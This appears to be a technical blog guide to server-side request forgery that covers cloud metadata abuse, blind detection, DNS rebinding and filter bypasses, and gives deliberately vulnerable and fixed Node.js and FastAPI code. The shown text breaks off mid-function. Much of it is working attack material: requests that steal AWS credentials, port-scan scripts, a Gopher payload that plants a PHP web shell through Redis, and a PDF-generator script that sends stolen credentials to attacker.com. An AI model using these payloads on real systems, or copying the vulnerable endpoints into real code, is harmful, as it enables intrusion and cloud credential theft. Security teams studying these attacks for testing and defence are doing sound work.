# SSRF and Internal Network Access: The Complete Exploitation and Defense Guide

**Meta Description:** A comprehensive technical guide to Server-Side Request Forgery (SSRF) covering AWS IMDS metadata abuse, cloud credential theft, blind SSRF, DNS rebinding, URL parser differentials, filter bypass techniques, SSRF in PDF generators and webhooks, with real payloads, Burp Collaborator workflows, and secure code in Node.js and FastAPI.

**Slug:** ssrf-internal-network-access-deep-dive

**Keywords:** SSRF vulnerability, server-side request forgery, AWS IMDS exploit, cloud metadata SSRF, blind SSRF, DNS rebinding attack, SSRF bypass techniques, Burp Collaborator SSRF, SSRF PDF generator, SSRF webhook vulnerability, IAM credential theft, internal network pivoting

---

## Introduction

Server-Side Request Forgery (SSRF) is the vulnerability class that turns your application server into an attack proxy. The attacker provides a URL, and your server fetches it. Instead of pointing to a legitimate external resource, the attacker points to internal services, cloud metadata endpoints, localhost admin panels, databases, and infrastructure that should never be reachable from the internet.

SSRF has been responsible for some of the most damaging breaches in recent history. The 2019 Capital One breach -- which exposed 106 million credit applications -- was executed through an SSRF vulnerability that accessed AWS metadata credentials. That single bug cost the company over $300 million in settlements and fines.

SSRF consistently appears in the OWASP Top 10 (added as a standalone category in 2021) and is one of the highest-paying vulnerability classes on bug bounty platforms. Critical SSRF bugs that expose cloud credentials or enable internal network pivoting regularly pay $10,000 to $100,000+.

This guide covers every major SSRF attack technique, from basic internal URL fetching to advanced cloud exploitation chains, DNS rebinding, parser differentials, and blind detection. Every payload is real. Every bypass is documented from actual engagements and disclosed reports. Every code example is functional.

---

## Basic SSRF: Fetching Internal URLs

### The Core Vulnerability

SSRF occurs whenever a server-side component makes an HTTP request to a URL that is influenced by user input. The canonical example is a "fetch URL" feature, a webhook configuration, an image import, or a URL preview function.

### Vulnerable Pattern

An endpoint that fetches a URL and returns the content:

```http
POST /api/fetch-url HTTP/1.1
Host: app.target.com
Content-Type: application/json
Authorization: Bearer eyJhbGciOiJIUzI1NiIs...

{
  "url": "https://example.com/page"
}
```

The attacker changes the URL to an internal resource:

```json
{
  "url": "http://127.0.0.1:8080/admin"
}
```

The server fetches `http://127.0.0.1:8080/admin` from its own network perspective. If there is an internal admin panel on port 8080 that is not exposed to the internet, the attacker now has access to it through the application server acting as a proxy.

### Common Internal Targets

```
http://127.0.0.1/
http://localhost/
http://0.0.0.0/
http://[::1]/                                    # IPv6 loopback
http://127.0.0.1:8080/admin                      # Internal admin panel
http://127.0.0.1:9200/_cat/indices               # Elasticsearch
http://127.0.0.1:6379/                           # Redis (HTTP to TCP -- may work)
http://127.0.0.1:8500/v1/agent/members           # Consul
http://127.0.0.1:8888/                           # Jupyter Notebook
http://10.0.0.1/                                 # Internal network gateway
http://192.168.1.1/                              # Internal network
http://172.16.0.1/                               # Internal network
http://169.254.169.254/                          # Cloud metadata (AWS/GCP/Azure)
```

### HTTP Request to Access Internal Elasticsearch

```http
POST /api/fetch-url HTTP/1.1
Host: app.target.com
Content-Type: application/json

{
  "url": "http://127.0.0.1:9200/_cat/indices?v"
}
```

**Response:**

```json
{
  "content": "health status index           uuid                   pri rep docs.count store.size\ngreen  open   users           abc123...              1   1   1524300    2.1gb\ngreen  open   transactions    def456...              5   1   89203321  45.2gb\ngreen  open   admin_sessions  ghi789...              1   1      4521     12mb\n"
}
```

The attacker can now enumerate and query every index in the internal Elasticsearch cluster.

---

## AWS IMDS Metadata Abuse

### The Attack Surface

Every EC2 instance, ECS container, Lambda function, and most AWS compute services have access to the Instance Metadata Service (IMDS) at `http://169.254.169.254`. This is a link-local address that is only reachable from the instance itself. It provides:

- Instance identity information
- Network configuration
- **IAM role temporary credentials** (the critical target)
- User data scripts (often contain secrets)
- Security group information

### IMDSv1 Exploitation (No Authentication)

IMDSv1 requires only a simple HTTP GET request. No headers, no tokens, no authentication.

```http
POST /api/fetch-url HTTP/1.1
Host: app.target.com
Content-Type: application/json

{
  "url": "http://169.254.169.254/latest/meta-data/"
}
```

**Response contains:**

```
ami-id
ami-launch-index
ami-manifest-path
hostname
iam/
instance-id
instance-type
local-hostname
local-ipv4
network/
placement/
public-hostname
public-ipv4
security-groups
```

### Stealing IAM Role Credentials

**Step 1: Discover the IAM role name:**

```json
{
  "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
}
```

Response: `my-app-role`

**Step 2: Fetch the temporary credentials:**

```json
{
  "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/my-app-role"
}
```

**Response:**

```json
{
  "Code": "Success",
  "LastUpdated": "2025-03-15T12:00:00Z",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIAIOSFODNN7EXAMPLE",
  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
  "Token": "IQoJb3JpZ2luX2VjEBYaCXVzLWVhc3QtMSJHMEUCIQD...",
  "Expiration": "2025-03-15T18:00:00Z"
}
```

The attacker now has temporary AWS credentials with all permissions of the IAM role attached to that instance. They can use these credentials from anywhere:

```bash
export AWS_ACCESS_KEY_ID="ASIAIOSFODNN7EXAMPLE"
export AWS_SECRET_ACCESS_KEY="wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
export AWS_SESSION_TOKEN="IQoJb3JpZ2luX2VjEBYaCXVzLWVhc3QtMSJHMEUCIQD..."

# List all S3 buckets
aws s3 ls

# Read DynamoDB tables
aws dynamodb list-tables --region us-east-1

# List secrets in Secrets Manager
aws secretsmanager list-secrets --region us-east-1

# Describe EC2 instances (map internal infrastructure)
aws ec2 describe-instances --region us-east-1
```

### Accessing User Data (Often Contains Secrets)

```json
{
  "url": "http://169.254.169.254/latest/user-data"
}
```

User data scripts frequently contain database passwords, API keys, configuration values, and bootstrap secrets that developers assumed would never be exposed.

### IMDSv2: The Token-Based Defense

IMDSv2 requires a PUT request to obtain a session token before any metadata can be accessed:

```bash
# Step 1: Get a session token (requires PUT with a specific header)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

# Step 2: Use the token to access metadata
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  "http://169.254.169.254/latest/meta-data/iam/security-credentials/my-app-role"
```

**Why IMDSv2 mitigates basic SSRF:** Most SSRF vulnerabilities only allow GET requests with limited header control. IMDSv2 requires:
1. A PUT request (many SSRF vectors only support GET)
2. A custom header (`X-aws-ec2-metadata-token-ttl-seconds`)
3. The token from step 1 to be included as a header in step 2

However, IMDSv2 is not a complete fix. If the SSRF allows arbitrary HTTP methods and custom headers (e.g., a webhook feature that lets the user configure the method and headers), IMDSv2 can still be bypassed.

### Enforcing IMDSv2

```bash
# Force IMDSv2 on an existing instance
aws ec2 modify-instance-metadata-options \
  --instance-id i-1234567890abcdef0 \
  --http-tokens required \
  --http-endpoint enabled \
  --http-put-response-hop-limit 1

# In CloudFormation / Terraform
resource "aws_instance" "web" {
  metadata_options {
    http_endpoint               = "enabled"
    http_tokens                 = "required"  # Forces IMDSv2
    http_put_response_hop_limit = 1           # Prevents container escape
  }
}
```

Setting `http_put_response_hop_limit` to 1 is critical for containerized environments. It prevents containers running on an EC2 instance from reaching IMDS through an extra network hop (e.g., Docker bridge network).

---

## Cloud Credential Theft Through SSRF

### GCP Metadata

GCP uses a different metadata endpoint but the same attack concept:

```
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```

GCP requires the `Metadata-Flavor: Google` header, which blocks most basic SSRF. But if the SSRF vector allows custom headers:

```json
{
  "url": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
  "headers": {
    "Metadata-Flavor": "Google"
  }
}
```

**Response:**

```json
{
  "access_token": "ya29.c.ElqBBw...",
  "expires_in": 3600,
  "token_type": "Bearer"
}
```

### Azure Metadata

```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
```

Azure requires `Metadata: true` header.

### Kubernetes Service Account Tokens

In Kubernetes, the service account token is mounted at a file path. If SSRF can read local files (via `file://` scheme):

```json
{
  "url": "file:///var/run/secrets/kubernetes.io/serviceaccount/token"
}
```

This token can be used to interact with the Kubernetes API server, potentially escalating to cluster-admin privileges.

---

## Internal Admin Panel Discovery via SSRF

### Port Scanning Through SSRF

SSRF can be used as an internal port scanner. By observing differences in response time, response size, or error messages, the attacker can map internal services.

**Port scan script via SSRF:**

```python
import requests
import time

TARGET = "https://app.target.com/api/fetch-url"
INTERNAL_HOST = "127.0.0.1"
PORTS = [22, 80, 443, 3000, 3306, 5432, 6379, 8080, 8443, 8500, 8888, 9200, 9090, 27017]

for port in PORTS:
    url = f"http://{INTERNAL_HOST}:{port}/"
    start = time.time()
    try:
        r = requests.post(TARGET, json={"url": url}, timeout=10)
        elapsed = time.time() - start
        print(f"Port {port}: Status={r.status_code}, Length={len(r.text)}, Time={elapsed:.2f}s")
    except requests.Timeout:
        print(f"Port {port}: Timeout (possibly filtered)")
    except Exception as e:
        print(f"Port {port}: Error - {e}")
```

**Internal network sweep:**

```python
# Scan internal /24 subnet
for i in range(1, 255):
    ip = f"10.0.1.{i}"
    url = f"http://{ip}/"
    try:
        r = requests.post(TARGET, json={"url": url}, timeout=3)
        if len(r.text) > 100:  # Non-trivial response
            print(f"[+] Live host: {ip} - Response length: {len(r.text)}")
    except:
        pass
```

### Common Internal Services Discovered

```
http://10.0.1.50:8080/jenkins/            # Jenkins CI
http://10.0.1.51:9090/                    # Prometheus
http://10.0.1.52:3000/                    # Grafana
http://10.0.1.53:8500/ui/                 # Consul
http://10.0.1.54:15672/                   # RabbitMQ Management
http://10.0.1.55:9200/_cluster/health     # Elasticsearch
http://10.0.1.56:2379/version             # etcd
http://10.0.1.57:6379/                    # Redis
http://10.0.1.58:27017/                   # MongoDB
http://10.0.1.59:11211/stats              # Memcached
```

---

## Accessing Localhost Services

### Redis via SSRF

Redis speaks a line-based text protocol. Some SSRF vectors allow sending arbitrary data to TCP services by abusing HTTP. The Gopher protocol is particularly useful for this.

**Redis command injection via Gopher:**

```
gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aSET%0d%0a$6%0d%0abackup%0d%0a$37%0d%0a<?php system($_GET['cmd']); ?>%0d%0a*4%0d%0a$6%0d%0aCONFIG%0d%0a$3%0d%0aSET%0d%0a$3%0d%0adir%0d%0a$15%0d%0a/var/www/html/%0d%0a*4%0d%0a$6%0d%0aCONFIG%0d%0a$3%0d%0aSET%0d%0a$10%0d%0adbfilename%0d%0a$9%0d%0ashell.php%0d%0a*1%0d%0a$4%0d%0aSAVE%0d%0a
```

This translates to:

```
SET backup "<?php system($_GET['cmd']); ?>"
CONFIG SET dir /var/www/html/
CONFIG SET dbfilename shell.php
SAVE
```

The Redis server writes a PHP web shell to the web root.

### Elasticsearch via SSRF

```json
{
  "url": "http://127.0.0.1:9200/_search?q=*&size=100"
}
```

Dump all indices, read sensitive data, or delete indices:

```json
{
  "url": "http://127.0.0.1:9200/users/_search?pretty&q=email:admin@*"
}
```

### Internal Jenkins RCE via Script Console

If Jenkins is running internally without authentication:

```json
{
  "url": "http://10.0.1.50:8080/jenkins/script?script=println+'id'.execute().text"
}
```

Or via POST:

```json
{
  "url": "http://10.0.1.50:8080/jenkins/scriptText",
  "method": "POST",
  "body": "script=println 'id'.execute().text"
}
```

### Consul Service Discovery

```json
{
  "url": "http://127.0.0.1:8500/v1/catalog/services"
}
```

Response reveals all registered services and their internal addresses, giving the attacker a complete map of the microservice architecture.

---

## DNS Rebinding Attacks

### The Attack

DNS rebinding bypasses SSRF filters that validate the hostname at request time. The attack exploits the gap between DNS resolution and the actual HTTP request.

**How it works:**

1. Attacker controls `evil.attacker.com`
2. First DNS lookup: `evil.attacker.com` resolves to `93.184.216.34` (attacker's IP)
3. Server validates the resolved IP: it is not internal, so the request is allowed
4. Between validation and the actual HTTP request, the DNS TTL expires
5. Second DNS lookup (for the actual connection): `evil.attacker.com` now resolves to `127.0.0.1`
6. Server connects to `127.0.0.1` -- the filter was bypassed

### Setting Up a DNS Rebinding Server

```python
# Simplified DNS rebinding server concept
# In practice, use tools like rbndr.us, singularity, or tavern

# The DNS server alternates responses:
# Request 1: Respond with attacker's public IP (passes validation)
# Request 2: Respond with 127.0.0.1 (actual request goes to localhost)
```

**Using rbndr.us service:**

The format is: `<public-ip>.<target-ip>.rbndr.us`

```
# This hostname alternates between resolving to 93.184.216.34 and 127.0.0.1
http://5db8d614.7f000001.rbndr.us/admin
```

(`5db8d614` = hex for `93.184.216.34`, `7f000001` = hex for `127.0.0.1`)

### Why Filters Fail

Most SSRF filters work like this:

```python
import socket

def is_safe_url(url):
    hostname = urlparse(url).hostname
    ip = socket.gethostbyname(hostname)  # DNS lookup #1
    if is_internal_ip(ip):
        return False
    return True

def fetch_url(url):
    if is_safe_url(url):
        return requests.get(url)  # DNS lookup #2 (may resolve differently)
```

There are two DNS lookups: one during validation and one during the actual request. DNS rebinding exploits this TOCTOU (time-of-check-time-of-use) gap.

### Prevention

```python
import socket
import ipaddress

def safe_fetch(url, timeout=5):
    parsed = urlparse(url)
    hostname = parsed.hostname

    # Resolve DNS ourselves
    ip = socket.gethostbyname(hostname)

    # Validate the resolved IP
    ip_obj = ipaddress.ip_address(ip)
    if ip_obj.is_private or ip_obj.is_loopback or ip_obj.is_link_local or ip_obj.is_reserved:
        raise ValueError(f"Resolved to blocked IP: {ip}")

    # Connect to the resolved IP directly, not the hostname
    # This eliminates the DNS rebinding window
    modified_url = url.replace(hostname, ip)
    return requests.get(
        modified_url,
        headers={"Host": hostname},  # Preserve the Host header
        timeout=timeout,
        allow_redirects=False  # Prevent redirect-based bypass
    )
```

---

## SSRF via URL Parsing Differences

### The Attack

Different URL parsers interpret the same URL differently. The security filter uses one parser, and the HTTP client uses another. If they disagree on what the hostname is, the filter can be bypassed.

### Parser Differential Examples

**Backslash confusion:**

```
http://attacker.com\@127.0.0.1/
```

- Some parsers see `attacker.com\` as the username and `127.0.0.1` as the host
- Other parsers see `attacker.com\@127.0.0.1` as the host

**Fragment confusion:**

```
http://127.0.0.1#@allowed-host.com/
```

- Some parsers see `allowed-host.com` as the host (treating `#@` as part of a fragment)
- Other parsers see `127.0.0.1` as the host

**Authority confusion with @:**

```
http://allowed-host.com@127.0.0.1/
```

In URL syntax, `user@host` is valid. The filter may check the part before `@` (the user info), but the HTTP client connects to the part after `@` (the host).

**Unicode normalization:**

```
http://127.0.0.1%E3%80%82attacker.com/
```

The encoded character `%E3%80%82` is a fullwidth period. Some parsers normalize this to a regular period, making the host `127.0.0.1.attacker.com`. Others treat it as part of the hostname.

### Real Parser Differential Test Cases

```python
test_urls = [
    "http://127.0.0.1:80@attacker.com/",
    "http://attacker.com:80#@127.0.0.1/",
    "http://attacker.com:80?@127.0.0.1/",
    "http://127.0.0.1\\@attacker.com/",
    "http://attacker.com%0d%0a%0d%0aGET /admin HTTP/1.1%0d%0aHost: 127.0.0.1%0d%0a%0d%0a@127.0.0.1/",
    "http://0x7f000001/",           # Hex IP
    "http://2130706433/",           # Decimal IP
    "http://0177.0.0.1/",          # Octal IP
    "http://127.1/",               # Shortened IP
    "http://0/",                   # Zero resolves to 0.0.0.0
    "http://[::1]/",               # IPv6 loopback
    "http://[0:0:0:0:0:ffff:127.0.0.1]/",  # IPv4-mapped IPv6
    "http://127.0.0.1.nip.io/",   # Wildcard DNS service
]
```

---

## Blind SSRF Detection

### What is Blind SSRF?

In blind SSRF, the server makes the request but does not return the response to the attacker. You cannot read the content of internal pages. However, you can still:

1. Confirm the vulnerability exists
2. Port scan internal networks (via timing or error differences)
3. Hit internal endpoints that trigger actions (e.g., webhooks, API calls)
4. Exfiltrate data through DNS (if the response is reflected in a DNS lookup)

### Out-of-Band Detection with Burp Collaborator

**Step 1: Generate a Collaborator payload:**

In Burp Suite Professional, go to Collaborator tab and click "Copy to clipboard" to get a unique subdomain like `a1b2c3d4e5.burpcollaborator.net`.

**Step 2: Inject the Collaborator URL:**

```json
{
  "url": "http://a1b2c3d4e5.burpcollaborator.net/"
}
```

```json
{
  "webhookUrl": "http://a1b2c3d4e5.burpcollaborator.net/callback"
}
```

```json
{
  "imageUrl": "http://a1b2c3d4e5.burpcollaborator.net/image.png"
}
```

**Step 3: Check Collaborator for interactions:**

If the Collaborator receives an HTTP or DNS request, the server made an outbound request to your controlled URL. SSRF is confirmed even if the application response reveals nothing.

### DNS-Based Exfiltration

Even if HTTP responses are not returned, data can be exfiltrated through DNS subdomains:

```json
{
  "url": "http://`whoami`.a1b2c3d4e5.burpcollaborator.net/"
}
```

If the server processes this in a shell context, the command output becomes a DNS subdomain lookup: `www-data.a1b2c3d4e5.burpcollaborator.net`. The Collaborator logs the DNS query, revealing the username.

For SSRF specifically, you can chain with internal services that echo data:

```json
{
  "url": "http://127.0.0.1:9200/"
}
```

Even blind, you confirm Elasticsearch is running if the response timing is different from a closed port.

### Timing-Based Internal Port Detection

```python
import requests
import time

TARGET = "https://app.target.com/api/preview"
INTERNAL = "10.0.1.100"

results = {}
for port in [22, 80, 443, 3306, 5432, 6379, 8080, 9200, 27017]:
    url = f"http://{INTERNAL}:{port}/"
    start = time.time()
    try:
        r = requests.post(TARGET, json={"url": url}, timeout=10)
        elapsed = time.time() - start
    except requests.Timeout:
        elapsed = 10.0
    results[port] = elapsed
    print(f"Port {port}: {elapsed:.3f}s - Status: {r.status_code if 'r' in dir() else 'timeout'}")

# Open ports typically respond faster than closed ports
# Connection refused (closed) is fast; filtered (no response) is slow
```

---

## SSRF Filter Bypass Techniques

### IP Address Encoding Variations

All of these resolve to `127.0.0.1`:

```
http://127.0.0.1/
http://0x7f000001/                     # Hexadecimal
http://2130706433/                     # Decimal
http://0177.0.0.1/                     # Octal
http://0x7f.0x0.0x0.0x1/             # Mixed hex octets
http://0177.0.0.01/                    # Mixed octal
http://127.1/                          # Shortened
http://127.0.1/                        # Shortened
http://0/                              # 0.0.0.0
http://0.0.0.0/                        # Explicit zero
http://[::1]/                          # IPv6 loopback
http://[0:0:0:0:0:ffff:127.0.0.1]/   # IPv4-mapped IPv6
http://[::ffff:127.0.0.1]/           # Compressed IPv4-mapped IPv6
http://[::ffff:7f00:1]/              # IPv4-mapped IPv6 hex
http://127.0.0.1.nip.io/             # Wildcard DNS
http://127.0.0.1.sslip.io/           # Wildcard DNS
http://localtest.me/                   # Resolves to 127.0.0.1
http://spoofed.burpcollaborator.net/   # Attacker-controlled DNS
```

### Redirect-Based Bypass

If the filter validates the initial URL but follows redirects, the attacker hosts a redirect on their server:

**Attacker's server (redirector):**

```python
from flask import Flask, redirect

app = Flask(__name__)

@app.route('/redirect')
def ssrf_redirect():
    return redirect('http://169.254.169.254/latest/meta-data/iam/security-credentials/')

app.run(host='0.0.0.0', port=80)
```

**SSRF payload:**

```json
{
  "url": "http://attacker.com/redirect"
}
```

The filter sees `attacker.com` (external, allowed). The server follows the 302 redirect to `169.254.169.254` (internal metadata).

### URL Scheme Bypass

```
file:///etc/passwd                     # Local file read
dict://127.0.0.1:6379/INFO            # Dict protocol to Redis
gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0aINFO%0d%0a   # Gopher to Redis
ftp://127.0.0.1/                       # FTP
tftp://127.0.0.1/                      # TFTP
ldap://127.0.0.1/                      # LDAP
ssh://127.0.0.1/                       # SSH
```

### Bypass via Open Redirect Chains

If the target application itself has an open redirect, you can chain it with SSRF:

```json
{
  "url": "https://app.target.com/redirect?url=http://169.254.169.254/latest/meta-data/"
}
```

The filter sees `app.target.com` (its own domain, allowed). The open redirect sends the request to the metadata endpoint.

### CRLF Injection in URL

```
http://attacker.com%0d%0aHost:%20127.0.0.1%0d%0a%0d%0a/
```

Some HTTP libraries are vulnerable to header injection through the URL, allowing the attacker to modify the Host header or inject additional requests.

---

## Chaining SSRF with File Read Bugs

### SSRF to Local File Read

If the SSRF handler supports the `file://` scheme:

```json
{
  "url": "file:///etc/passwd"
}
```

```json
{
  "url": "file:///proc/self/environ"
}
```

`/proc/self/environ` often contains environment variables with database credentials, API keys, and secrets.

```json
{
  "url": "file:///proc/self/cmdline"
}
```

Reveals the command line used to start the process, including configuration file paths.

**Reading application source code:**

```json
{
  "url": "file:///var/www/app/config/database.yml"
}
```

```json
{
  "url": "file:///var/www/app/.env"
}
```

### Chain: SSRF -> File Read -> Credential Discovery -> Database Access

1. **SSRF:** `file:///proc/self/environ` reveals `DATABASE_URL=postgres://admin:s3cretP4ss@10.0.1.30:5432/appdb`
2. **SSRF:** `http://10.0.1.30:5432/` confirms PostgreSQL is reachable
3. Use the discovered credentials to connect to the database from the SSRF (if the endpoint supports different schemes) or report the full chain

---

## SSRF in PDF Generators, Image Processors, and Webhooks

### PDF Generator SSRF

Many applications generate PDFs from HTML content. Libraries like wkhtmltopdf, Puppeteer, WeasyPrint, and Prince execute HTML/CSS including fetching external resources. If the HTML content is user-controlled, any resource reference becomes an SSRF vector.

**Payload in HTML-to-PDF conversion:**

```html
<html>
<body>
  <img src="http://169.254.169.254/latest/meta-data/iam/security-credentials/app-role" />
  <link rel="stylesheet" href="http://169.254.169.254/latest/user-data" />
  <iframe src="http://127.0.0.1:8080/admin"></iframe>

  <!-- JavaScript-based exfiltration (works with Puppeteer/wkhtmltopdf) -->
  <script>
    fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/')
      .then(r => r.text())
      .then(role => fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/' + role))
      .then(r => r.text())
      .then(creds => {
        // Exfiltrate via DNS
        new Image().src = 'http://' + btoa(creds).substring(0, 60) + '.attacker.com/';
      });
  </script>
</body>
</html>
```

**Payload via CSS:**

```css
@font-face {
  font-family: 'exploit';
  src: url('http://169.254.169.254/latest/meta-data/');
}

body {
  background: url('http://127.0.0.1:8080/admin/');
}
```

### Image Processor SSRF

Applications that resize, crop, or transcode images often fetch the source image from a URL:

```json
{
  "imageUrl": "http://169.254.169.254/latest/meta-data/iam/security-credentials/app-role",
  "width": 200,
  "height": 200
}
```

Even if the response is not a valid image and the processing fails, the HTTP request to the internal endpoint was already made.

### Webhook SSRF

Webhook configurations allow users to specify a URL that the application will send HTTP requests to when events occur. This is one of the most common SSRF vectors because the entire purpose of the feature is to make outbound HTTP requests to user-specified URLs.

```json
{
  "event": "order.completed",
  "webhookUrl": "http://169.254.169.254/latest/meta-data/iam/security-credentials/app-role",
  "method": "POST"
}
```

The application stores this webhook URL and calls it when an order is completed. The SSRF fires asynchronously, making it blind by default.

**Testing workflow:**

1. Set the webhook URL to a Burp Collaborator domain
2. Trigger the event (complete an order, push a commit, etc.)
3. Check Collaborator for the interaction
4. Replace the URL with internal targets

---

## Express.js Vulnerable SSRF Endpoint + Fixed Code

### Vulnerable Implementation

```javascript
const express = require('express');
const axios = require('axios');

const app = express();
app.use(express.json());

// VULNERABLE: No URL validation whatsoever
app.post('/api/fetch-url', async (req, res) => {
  try {
    const { url } = req.body;
    const response = await axios.get(url, { timeout: 10000 });
    res.json({
      status: response.status,
      headers: response.headers,
      data: response.data
    });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// VULNERABLE: URL preview feature
app.post('/api/link-preview', async (req, res) => {
  try {
    const { url } = req.body;
    const response = await axios.get(url);

    // Extract title and description from HTML
    const titleMatch = response.data.match(/<title>(.*?)<\/title>/i);
    const title = titleMatch ? titleMatch[1] : 'No title';

    res.json({ title, url });
  } catch (error) {
    res.status(500).json({ error: 'Failed to fetch URL' });
  }
});

// VULNERABLE: Webhook configuration
app.post('/api/webhooks', async (req, res) => {
  const { url, event } = req.body;
  // Stores webhook URL without validation
  // await db.webhooks.create({ url, event, userId: req.user.id });
  res.json({ message: 'Webhook registered' });
});

app.listen(3000);
```

### Secure Implementation

```javascript
const express = require('express');
const axios = require('axios');
const { URL } = require('url');
const dns = require('dns');
const { promisify } = require('util');
const ipaddr = require('ipaddr.js');
const net = require('net');

const dnsResolve = promisify(dns.resolve4);

const app = express();
app.use(express.json());

// Allowlist of permitted schemes
const ALLOWED_SCHEMES = ['http:', 'https:'];

// Blocklist of internal IP ranges
function isBlockedIP(ip) {
  try {
    const parsed = ipaddr.parse(ip);
    const range = parsed.range();
    const blockedRanges = [
      'loopback',        // 127.0.0.0/8
      'private',         // 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16
      'linkLocal',       // 169.254.0.0/16 (AWS metadata)
      'uniqueLocal',     // fc00::/7
      'unspecified',     // 0.0.0.0
      'reserved',
      'benchmarking',
      'amt',
      'broadcast',
      'ietf',
      'nat64',
      'orchid',
      'orchidV2'
    ];
    return blockedRanges.includes(range);
  } catch (e) {
    return true; // If we can't parse it, block it
  }
}

async function validateAndResolveURL(userUrl) {
  // Parse the URL
  let parsed;
  try {
    parsed = new URL(userUrl);
  } catch (e) {
    throw new Error('Invalid URL format');
  }

  // Validate scheme
  if (!ALLOWED_SCHEMES.includes(parsed.protocol)) {
    throw new Error(`Blocked scheme: ${parsed.protocol}`);
  }

  // Reject URLs with credentials
  if (parsed.username || parsed.password) {
    throw new Error('URLs with credentials are not allowed');
  }

  // Reject IP addresses directly in the URL (force DNS resolution)
  const hostname = parsed.hostname;
  if (net.isIP(hostname)) {
    if (isBlockedIP(hostname)) {
      throw new Error('Blocked IP address');
    }
    return { url: userUrl, resolvedIP: hostname };
  }

  // Resolve DNS and validate the resolved IP
  let addresses;
  try {
    addresses = await dnsResolve(hostname);
  } catch (e) {
    throw new Error('DNS resolution failed');
  }

  for (const ip of addresses) {
    if (isBlockedIP(ip)) {
      throw new Error(`Hostname resolves to blocked IP: ${ip}`);
    }
  }

  // Return the URL with the resolved IP to prevent DNS rebinding
  // Connect to the resolved IP but preserve the Host header
  const resolvedUrl = new URL(userUrl);
  resolvedUrl.hostname = addresses[0];

  return {
    url: resolvedUrl.toString(),
    originalHost: hostname,
    resolvedIP: addresses[0]
  };
}

app.post('/api/fetch-url', async (req, res) => {
  try {
    const { url } = req.body;

    if (!url || typeof url !== 'string') {
      return res.status(400).json({ error: 'URL is required' });
    }

    // Validate and resolve the URL
    const validated = await validateAndResolveURL(url);

    // Make the request to the resolved IP with original Host header
    const response = await axios.get(validated.url, {
      timeout: 5000,
      maxRedirects: 0,  // Do not follow redirects (prevent redirect-based bypass)
      headers: {
        'Host': validated.originalHost || new URL(url).hostname
      },
      validateStatus: () => true,
      maxContentLength: 1024 * 1024  // 1MB max response
    });

    // Return only safe response data
    res.json({
      status: response.status,
      contentType: response.headers['content-type'],
      data: typeof response.data === 'string'
        ? response.data.substring(0, 10000)  // Truncate response
        : response.data
    });
  } catch (error) {
    res.status(400).json({ error: error.message });
  }
});

// Secure webhook registration
app.post('/api/webhooks', async (req, res) => {
  try {
    const { url, event } = req.body;

    // Validate the webhook URL before storing
    await validateAndResolveURL(url);

    // Additional: Only allow HTTPS for webhooks
    if (!url.startsWith('https://')) {
      return res.status(400).json({ error: 'Webhook URLs must use HTTPS' });
    }

    // Store the webhook
    // await db.webhooks.create({ url, event, userId: req.user.id });
    res.json({ message: 'Webhook registered' });
  } catch (error) {
    res.status(400).json({ error: error.message });
  }
});

app.listen(3000);
```

---

## FastAPI Vulnerable SSRF Endpoint + Fixed Code

### Vulnerable Implementation

```python
from fastapi import FastAPI
import httpx

app = FastAPI()

# VULNERABLE: No URL validation
@app.post("/api/fetch-url")
async def fetch_url(data: dict):
    url = data.get("url")
    async with httpx.AsyncClient() as client:
        response = await client.get(url, timeout=10)
    return {
        "status": response.status_code,
        "headers": dict(response.headers),
        "body": response.text
    }

# VULNERABLE: Image import from URL
@app.post("/api/import-image")
async def import_image(data: dict):
    url = data.get("imageUrl")
    async with httpx.AsyncClient() as client:
        response = await client.get(url)

    # Save the image
    with open(f"/tmp/imported_{hash(url)}.jpg", "wb") as f:
        f.write(response.content)

    return {"message": "Image imported"}

# VULNERABLE: Webhook delivery
@app.post("/api/webhooks/test")
async def test_webhook(data: dict):
    url = data.get("webhookUrl")
    payload = {"event": "test", "timestamp": "2025-03-15T12:00:00Z"}
    async with httpx.AsyncClient() as client:
        response = await client.post(url, json=payload)
    return {"status": response.status_code}
```

### Secure Implementation

```python
import ipaddress
import socket
from urllib.parse import urlparse
from typing import Optional
from fastapi import FastAPI, HTTPException
from pydantic import BaseModel, HttpUrl
import httpx

app = FastAPI()

ALLOWED_SCHEMES = {"http", "https"}
BLOCKED_RANGES = [
    ipaddress.ip_network("127.0.0.0/8"),      # Loopback
    ipaddress.ip_network("10.0.0.0/8"),        # Private
    ipaddress.ip_network("172.16.0.0/12"),     # Private
    ipaddress.ip_network("192.168.0.0/16"),    # Private
    ipaddress.ip_network("169.254.0.0/16"),    # Link-local (AWS metadata)
    ipaddress.ip_network("0.0.0.0/8"),         # Unspecified
    ipaddress.ip_network("100.64.0.0/10"),     # Shared address space
    ipaddress.ip_network("198.18.0.0/15"),     # Benchmarking
    ipaddress.ip_network("::1/128"),           # IPv6 loopback
    ipaddress.ip_network("fc00::/7"),          # IPv6 unique local
    ipaddress.ip_network("fe80::/10"),         # IPv6 link-local
    ipaddress.ip_network("::ffff:0:0/96"),     # IPv4-mapped IPv6
]


def is_blocked_ip(ip_str: str) -> bool:
    """Check if an IP address falls within blocked ranges."""
    try:
        ip = ipaddress.ip_address(ip_str)
        return any(ip in network for network in BLOCKED_RANGES)
    except ValueError:
        return True  # If we cannot parse it, block it


def validate_url(url: str) -> dict:
    """Validate URL and resolve DNS to prevent SSRF."""
    # Parse URL
    try:
        parsed = urlparse(url)
    except Exception:
        raise HTTPException(status_code=400, detail="Invalid URL")

    # Check scheme
    if parsed.scheme not in ALLOWED_SCHEMES:
        raise HTTPException(status_code=400, detail=f"Blocked scheme: {parsed.scheme}")

    # Reject URLs with credentials
